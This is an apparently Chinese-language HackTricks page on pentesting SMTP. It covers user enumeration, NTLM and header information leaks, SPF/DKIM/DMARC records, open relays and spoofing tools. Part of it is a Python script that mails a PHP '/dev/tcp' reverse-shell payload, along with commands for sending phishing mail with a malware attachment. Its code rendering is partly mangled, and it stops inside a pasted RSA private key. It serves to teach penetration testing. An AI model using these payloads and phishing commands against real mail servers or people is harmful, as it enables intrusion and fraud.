<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>25,465,587 - Pentesting SMTP/s</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="25465587---pentesting-smtps"><a class="header" href="#25465587---pentesting-smtps">25,465,587 - Pentesting SMTP/s</a></h1>
<p>{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<figure><img src="../../.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
<p><strong>从黑客的角度看待您的网络应用、网络和云</strong></p>
<p><strong>发现并报告具有实际商业影响的关键可利用漏洞。</strong> 使用我们 20 多个自定义工具来映射攻击面，查找允许您提升权限的安全问题，并使用自动化利用收集重要证据，将您的辛勤工作转化为有说服力的报告。</p>
<p>{% embed url="https://pentest-tools.com/?utm_term=jul2024&amp;utm_medium=link&amp;utm_source=hacktricks&amp;utm_campaign=spons" %}</p>
<h2 id="基本信息"><a class="header" href="#基本信息"><strong>基本信息</strong></a></h2>
<p><strong>简单邮件传输协议 (SMTP)</strong> 是在 TCP/IP 套件中用于 <strong>发送和接收电子邮件</strong> 的协议。由于其在接收方排队消息的局限性，SMTP 通常与 <strong>POP3 或 IMAP</strong> 一起使用。这些附加协议使用户能够将消息存储在服务器邮箱中并定期下载。</p>
<p>在实践中，<strong>电子邮件程序</strong> 通常使用 <strong>SMTP 发送电子邮件</strong>，而使用 <strong>POP3 或 IMAP 接收</strong> 它们。在基于 Unix 的系统中，<strong>sendmail</strong> 是最常用于电子邮件的 SMTP 服务器。商业软件包 Sendmail 包含一个 POP3 服务器。此外，<strong>Microsoft Exchange</strong> 提供一个 SMTP 服务器，并提供包括 POP3 支持的选项。</p>
<p><strong>默认端口：</strong> 25,465(ssl),587(ssl)</p>
<pre><code>PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
</code></pre>
<h3 id="email-headers"><a class="header" href="#email-headers">EMAIL Headers</a></h3>
<p>如果你有机会<strong>让受害者给你发送一封邮件</strong>（例如通过网页的联系表单），请这样做，因为<strong>你可以通过查看邮件的头部了解受害者的内部拓扑</strong>。</p>
<p>你也可以从SMTP服务器获取一封邮件，尝试<strong>向该服务器发送一封邮件到一个不存在的地址</strong>（因为服务器会向攻击者发送一封NDN邮件）。但是，请确保你从一个允许的地址发送邮件（检查SPF策略），并且你可以接收NDN消息。</p>
<p>你还应该尝试<strong>发送不同的内容，因为你可以在头部找到更有趣的信息</strong>，例如：<code>X-Virus-Scanned: by av.domain.com</code><br />
你应该发送EICAR测试文件。<br />
检测<strong>AV</strong>可能允许你利用<strong>已知漏洞</strong>。</p>
<h2 id="basic-actions"><a class="header" href="#basic-actions">Basic actions</a></h2>
<h3 id="banner-grabbingbasic-connection"><a class="header" href="#banner-grabbingbasic-connection"><strong>Banner Grabbing/Basic connection</strong></a></h3>
<p><strong>SMTP:</strong></p>
<pre><code class="language-bash">nc -vn &lt;IP&gt; 25
</code></pre>
<p><strong>SMTPS</strong>:</p>
<pre><code class="language-bash">openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
</code></pre>
<h3 id="查找组织的-mx-服务器"><a class="header" href="#查找组织的-mx-服务器">查找组织的 MX 服务器</a></h3>
<pre><code class="language-bash">dig +short mx google.com
</code></pre>
<h3 id="枚举"><a class="header" href="#枚举">枚举</a></h3>
<pre><code class="language-bash">nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
</code></pre>
<h3 id="ntlm-auth---信息泄露"><a class="header" href="#ntlm-auth---信息泄露">NTLM Auth - 信息泄露</a></h3>
<p>如果服务器支持 NTLM 认证（Windows），您可以获取敏感信息（版本）。更多信息 <a href="https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666"><strong>这里</strong></a>。</p>
<pre><code class="language-bash">root@kali: telnet example.com 587
220 example.com SMTP Server Banner
&gt;&gt; HELO
250 example.com Hello [x.x.x.x]
&gt;&gt; AUTH NTLM 334
NTLM supported
&gt;&gt; TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
</code></pre>
<p>Or <strong>automate</strong> this with <strong>nmap</strong> plugin <code>smtp-ntlm-info.nse</code></p>
<h3 id="内部服务器名称---信息泄露"><a class="header" href="#内部服务器名称---信息泄露">内部服务器名称 - 信息泄露</a></h3>
<p>一些SMTP服务器在发出“MAIL FROM”命令时，如果没有完整地址，会自动补全发件人的地址，从而泄露其内部名称：</p>
<pre><code>220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
</code></pre>
<h3 id="sniffing"><a class="header" href="#sniffing">Sniffing</a></h3>
<p>检查是否从发送到端口 25 的数据包中嗅探到一些密码</p>
<h3 id="auth-bruteforce"><a class="header" href="#auth-bruteforce"><a href="../../generic-hacking/brute-force.html#smtp">Auth bruteforce</a></a></h3>
<h2 id="用户名暴力破解枚举"><a class="header" href="#用户名暴力破解枚举">用户名暴力破解枚举</a></h2>
<p><strong>认证并不总是需要</strong></p>
<h3 id="rcpt-to"><a class="header" href="#rcpt-to">RCPT TO</a></h3>
<pre><code class="language-bash">$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
MAIL FROM:example@domain.com
250 2.1.0 example@domain.com... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
</code></pre>
<h3 id="vrfy"><a class="header" href="#vrfy">VRFY</a></h3>
<pre><code class="language-bash">$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
VRFY root
250 Super-User root@myhost
VRFY blah
550 blah... User unknown
</code></pre>
<h3 id="expn"><a class="header" href="#expn">EXPN</a></h3>
<pre><code class="language-bash">$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 ed.williams@myhost
EXPN sshd
250 2.1.5 sshd privsep sshd@myhost
</code></pre>
<h3 id="自动化工具"><a class="header" href="#自动化工具">自动化工具</a></h3>
<pre><code>Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M &lt;MODE&gt; -u &lt;USER&gt; -t &lt;IP&gt;
Nmap: nmap --script smtp-enum-users &lt;IP&gt;
</code></pre>
<figure><img src="../../.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
<p><strong>从黑客的角度看待您的网络应用、网络和云</strong></p>
<p><strong>查找并报告具有实际业务影响的关键可利用漏洞。</strong> 使用我们20多个自定义工具来映射攻击面，查找允许您提升权限的安全问题，并使用自动化利用收集重要证据，将您的辛勤工作转化为有说服力的报告。</p>
<p>{% embed url="https://pentest-tools.com/?utm_term=jul2024&amp;utm_medium=link&amp;utm_source=hacktricks&amp;utm_campaign=spons" %}</p>
<h2 id="dsn报告"><a class="header" href="#dsn报告">DSN报告</a></h2>
<p><strong>投递状态通知报告</strong>：如果您向一个组织发送电子邮件到一个<strong>无效地址</strong>，该组织将通知您该地址无效，并<strong>将邮件发送回您</strong>。<strong>返回邮件的头部</strong>将<strong>包含</strong>可能的<strong>敏感信息</strong>（如与报告交互的邮件服务的IP地址或防病毒软件信息）。</p>
<h2 id="命令"><a class="header" href="#命令"><a href="smtp-commands.html">命令</a></a></h2>
<h3 id="从linux控制台发送电子邮件"><a class="header" href="#从linux控制台发送电子邮件">从linux控制台发送电子邮件</a></h3>
<pre><code class="language-bash">sendEmail -t to@domain.com -f from@attacker.com -s &lt;ip smtp&gt; -u "Important subject" -a /tmp/malware.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

&lt;phishing message&gt;
</code></pre>
<pre><code class="language-bash">swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
</code></pre>
<h3 id="使用-python-发送电子邮件"><a class="header" href="#使用-python-发送电子邮件">使用 Python 发送电子邮件</a></h3>
<details>
<summary>这里是 Python 代码</summary>
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys
<p>lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587</p>
<h1 id="create-message-object-instance"><a class="header" href="#create-message-object-instance">create message object instance</a></h1>
<p>msg = MIMEMultipart()</p>
<h1 id="setup-the-parameters-of-the-message"><a class="header" href="#setup-the-parameters-of-the-message">setup the parameters of the message</a></h1>
<p>password = ""
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"</p>
<h1 id="payload"><a class="header" href="#payload">payload</a></h1>
<p>message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))</p>
<p>print("[*] Payload is generated : %s" % message)</p>
<p>msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)</p>
<p>if server.noop()[0] != 250:
print("[-]Connection Error")
exit()</p>
<p>server.starttls()</p>
<h1 id="uncomment-if-log-in-with-authencation"><a class="header" href="#uncomment-if-log-in-with-authencation">Uncomment if log-in with authencation</a></h1>
<h1 id="serverloginmsgfrom-password"><a class="header" href="#serverloginmsgfrom-password">server.login(msg['From'], password)</a></h1>
<p>server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()</p>
<p>print("[***]successfully sent email to %s:" % (msg['To']))</p>
<pre><code>&lt;/details&gt;

## SMTP Smuggling

SMTP Smuggling 漏洞允许绕过所有 SMTP 保护（有关保护的更多信息，请查看下一节）。有关 SMTP Smuggling 的更多信息，请查看：

{% content-ref url="smtp-smuggling.md" %}
[smtp-smuggling.md](smtp-smuggling.md)
{% endcontent-ref %}

## 邮件伪造对策

由于伪造 SMTP 消息的容易性，组织通过采用 **SPF**、**DKIM** 和 **DMARC** 来防止未经授权的电子邮件代表他们发送。

有关这些对策的 **完整指南** 可在 [https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/) 获取。

### SPF

{% hint style="danger" %}
SPF [在 2014 年被“弃用”](https://aws.amazon.com/premiumsupport/knowledge-center/route53-spf-record/)。这意味着您应该在 `domain.com` 中创建 **TXT 记录**，而不是在 `_spf.domain.com` 中，使用 **相同的语法**。\
此外，为了重用以前的 SPF 记录，通常会发现类似于 `"v=spf1 include:_spf.google.com ~all"` 的内容。
{% endhint %}

**发送方策略框架**（SPF）是一种机制，使邮件传输代理（MTA）能够通过查询组织定义的授权邮件服务器列表来验证发送电子邮件的主机是否被授权。该列表指定了 **被授权代表域名发送电子邮件的 IP 地址/范围、域名和其他实体**，并在 SPF 记录中包含各种“**机制**”。

#### 机制

来自 [维基百科](https://en.wikipedia.org/wiki/Sender_Policy_Framework)：

| 机制      | 描述                                                                                                                                                                                                                                                                                                                         |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ALL       | 始终匹配；用于默认结果，如 `-all`，适用于未被先前机制匹配的所有 IP。                                                                                                                                                                                                                                  |
| A         | 如果域名有一个地址记录（A 或 AAAA），且可以解析为发送者的地址，则匹配。                                                                                                                                                                                                                   |
| IP4       | 如果发送者在给定的 IPv4 地址范围内，则匹配。                                                                                                                                                                                                                                                                              |
| IP6       | 如果发送者在给定的 IPv6 地址范围内，则匹配。                                                                                                                                                                                                                                                                              |
| MX        | 如果域名有一个 MX 记录解析为发送者的地址，则匹配（即邮件来自该域的一个入站邮件服务器）。                                                                                                                                                                          |
| PTR       | 如果客户端地址的域名（PTR 记录）在给定域中，并且该域名解析为客户端地址（前向确认的反向 DNS），则匹配。此机制不推荐使用，尽可能避免。                                                                                     |
| EXISTS    | 如果给定的域名解析为任何地址，则匹配（无论解析为哪个地址）。这很少使用。与 SPF 宏语言一起，它提供了更复杂的匹配，如 DNSBL 查询。                                                                                                                           |
| INCLUDE   | 引用另一个域的策略。如果该域的策略通过，则此机制通过。然而，如果包含的策略失败，则继续处理。要完全委托给另一个域的策略，必须使用重定向扩展。                                                                                     |
| REDIRECT  | &lt;p&gt;重定向是指向另一个域名的指针，该域名托管 SPF 策略，它允许多个域共享相同的 SPF 策略。当处理大量共享相同电子邮件基础设施的域时，它非常有用。&lt;/p&gt;&lt;p&gt;将使用重定向机制中指示的域的 SPF 策略。&lt;/p&gt; |

还可以识别 **限定符**，指示 **如果匹配机制应该采取什么措施**。默认情况下，使用 **限定符 "+"**（因此如果匹配任何机制，则表示允许）。\
您通常会注意到 **每个 SPF 策略的末尾** 有类似于：**\~all** 或 **-all** 的内容。这用于指示 **如果发送者不匹配任何 SPF 策略，则应将电子邮件标记为不可信（\~）或拒绝（-）该电子邮件。**

#### 限定符

策略中的每个机制可以由四个限定符之一前缀，以定义预期结果：

* **`+`**：对应于通过结果。默认情况下，机制假定此限定符，使得 `+mx` 等同于 `mx`。
* **`?`**：表示中立结果，类似于无（没有特定策略）。
* **`~`**：表示软失败，作为中立和失败之间的中间状态。符合此结果的电子邮件通常被接受，但会相应标记。
* **`-`**：表示失败，建议直接拒绝该电子邮件。

在即将到来的示例中，**google.com 的 SPF 策略** 被说明。请注意在第一个 SPF 策略中包含来自不同域的 SPF 策略：
```shell-session
dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

dig txt _spf.google.com | grep spf
; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.7-Ubuntu &lt;&lt;&gt;&gt; txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
</code></pre>
<p>传统上，可以伪造任何没有正确/任何 SPF 记录的域名。<strong>如今</strong>，如果<strong>电子邮件</strong>来自<strong>没有有效 SPF 记录的域名</strong>，则可能会<strong>自动被拒绝/标记为不可信</strong>。</p>
<p>要检查域的 SPF，您可以使用在线工具，例如：<a href="https://www.kitterman.com/spf/validate.html">https://www.kitterman.com/spf/validate.html</a></p>
<h3 id="dkim-domainkeys-identified-mail"><a class="header" href="#dkim-domainkeys-identified-mail">DKIM (DomainKeys Identified Mail)</a></h3>
<p>DKIM 用于签署外发电子邮件，允许外部邮件传输代理 (MTA) 通过从 DNS 检索域的公钥来验证它们。此公钥位于域的 TXT 记录中。要访问此密钥，必须知道选择器和域名。</p>
<p>例如，要请求密钥，域名和选择器是必需的。这些可以在邮件头 <code>DKIM-Signature</code> 中找到，例如 <code>d=gmail.com;s=20120113</code>。</p>
<p>获取此信息的命令可能如下所示：</p>
<pre><code class="language-bash">dig 20120113._domainkey.gmail.com TXT | grep p=
# This command would return something like:
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
</code></pre>
<h3 id="dmarc-基于域的消息认证报告和一致性"><a class="header" href="#dmarc-基于域的消息认证报告和一致性">DMARC (基于域的消息认证、报告和一致性)</a></h3>
<p>DMARC 通过建立在 SPF 和 DKIM 协议之上来增强电子邮件安全性。它概述了指导邮件服务器处理来自特定域的电子邮件的政策，包括如何处理身份验证失败以及将关于电子邮件处理操作的报告发送到哪里。</p>
<p><strong>要获取 DMARC 记录，您需要查询子域 _dmarc</strong></p>
<pre><code class="language-bash"># Reject
dig _dmarc.facebook.com txt | grep DMARC
_dmarc.facebook.com.	3600	IN	TXT	"v=DMARC1; p=reject; rua=mailto:a@dmarc.facebookmail.com; ruf=mailto:fb-dmarc@datafeeds.phishlabs.com; pct=100"

# Quarantine
dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com.	300	IN	TXT	"v=DMARC1; p=quarantine; rua=mailto:mailauth-reports@google.com"

# None
dig _dmarc.bing.com txt | grep DMARC
_dmarc.bing.com.	3600	IN	TXT	"v=DMARC1; p=none; pct=100; rua=mailto:BingEmailDMARC@microsoft.com;"
</code></pre>
<h4 id="dmarc-标签"><a class="header" href="#dmarc-标签">DMARC 标签</a></h4>
<div class="table-wrapper"><table><thead><tr><th>标签名称</th><th>目的</th><th>示例</th></tr></thead><tbody>
<tr><td>v</td><td>协议版本</td><td>v=DMARC1</td></tr>
<tr><td>pct</td><td>受过滤消息的百分比</td><td>pct=20</td></tr>
<tr><td>ruf</td><td>取证报告的报告 URI</td><td>ruf=mailto:authfail@example.com</td></tr>
<tr><td>rua</td><td>汇总报告的报告 URI</td><td>rua=mailto:aggrep@example.com</td></tr>
<tr><td>p</td><td>组织域的政策</td><td>p=quarantine</td></tr>
<tr><td>sp</td><td>组织域子域的政策</td><td>sp=reject</td></tr>
<tr><td>adkim</td><td>DKIM 的对齐模式</td><td>adkim=s</td></tr>
<tr><td>aspf</td><td>SPF 的对齐模式</td><td>aspf=r</td></tr>
</tbody></table>
</div>
<h3 id="子域怎么办"><a class="header" href="#子域怎么办"><strong>子域怎么办？</strong></a></h3>
<p><strong>来自</strong> <a href="https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains"><strong>这里</strong></a><strong>.</strong><br />
您需要为每个希望发送邮件的子域拥有单独的 SPF 记录。<br />
以下内容最初发布在 openspf.org 上，该网站曾是此类信息的极好资源。</p>
<blockquote>
<p>恶魔问题：子域怎么办？</p>
<p>如果我从 pielovers.demon.co.uk 收到邮件，而 pielovers 没有 SPF 数据，我应该回到上一级并测试 demon.co.uk 的 SPF 吗？不应该。Demon 的每个子域都是不同的客户，每个客户可能有自己的政策。Demon 的政策默认适用于所有客户是没有意义的；如果 Demon 想这样做，可以为每个子域设置 SPF 记录。</p>
<p>因此，给 SPF 发布者的建议是：您应该为每个具有 A 或 MX 记录的子域或主机名添加 SPF 记录。</p>
<p>具有通配符 A 或 MX 记录的网站也应该具有通配符 SPF 记录，形式为：* IN TXT "v=spf1 -all"</p>
</blockquote>
<p>这很有道理——子域可能位于不同的地理位置，并且具有非常不同的 SPF 定义。</p>
<h3 id="开放转发"><a class="header" href="#开放转发"><strong>开放转发</strong></a></h3>
<p>当发送电子邮件时，确保它们不会被标记为垃圾邮件至关重要。这通常通过使用<strong>受收件人信任的中继服务器</strong>来实现。然而，一个常见的挑战是，管理员可能并不完全了解哪些<strong>IP 范围是安全的</strong>。这种缺乏理解可能导致在设置 SMTP 服务器时出现错误，这是安全评估中经常识别的风险。</p>
<p>一些管理员使用的解决方法是为了避免电子邮件投递问题，特别是与潜在或正在进行的客户的通信，<strong>允许来自任何 IP 地址的连接</strong>。这通过配置 SMTP 服务器的 <code>mynetworks</code> 参数以接受所有 IP 地址来实现，如下所示：</p>
<pre><code class="language-bash">mynetworks = 0.0.0.0/0
</code></pre>
<p>为了检查邮件服务器是否是开放转发（这意味着它可以从任何外部来源转发电子邮件），通常使用 <code>nmap</code> 工具。它包括一个专门用于测试的脚本。在服务器上进行详细扫描的命令（例如，IP 为 10.10.10.10）在端口 25 上使用 <code>nmap</code> 是：</p>
<pre><code class="language-bash">nmap -p25 --script smtp-open-relay 10.10.10.10 -v
</code></pre>
<h3 id="工具"><a class="header" href="#工具"><strong>工具</strong></a></h3>
<ul>
<li><a href="https://github.com/serain/mailspoof"><strong>https://github.com/serain/mailspoof</strong></a> <strong>检查 SPF 和 DMARC 配置错误</strong></li>
<li><a href="https://pypi.org/project/checkdmarc/"><strong>https://pypi.org/project/checkdmarc/</strong></a> <strong>自动获取 SPF 和 DMARC 配置</strong></li>
</ul>
<h3 id="发送伪造邮件"><a class="header" href="#发送伪造邮件">发送伪造邮件</a></h3>
<ul>
<li><a href="https://www.mailsploit.com/index"><strong>https://www.mailsploit.com/index</strong></a></li>
<li><a href="http://www.anonymailer.net"><strong>http://www.anonymailer.net/</strong></a></li>
<li><a href="https://emkei.cz/"><strong>https://emkei.cz/</strong></a></li>
</ul>
<p><strong>或者你可以使用一个工具：</strong></p>
<ul>
<li><a href="https://github.com/magichk/magicspoofing"><strong>https://github.com/magichk/magicspoofing</strong></a></li>
</ul>
<pre><code class="language-bash"># This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
</code></pre>
<p>{% hint style="warning" %}
如果您在使用 dkim python lib 解析密钥时遇到任何 <strong>错误</strong>，请随意使用以下内容。<br />
<strong>注意</strong>：这只是一个临时解决方案，用于在某些情况下快速检查，其中 openssl 私钥 <strong>无法被 dkim 解析</strong>。</p>
<pre><code>-----BEGIN RSA PRIVATE KEY-----
MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
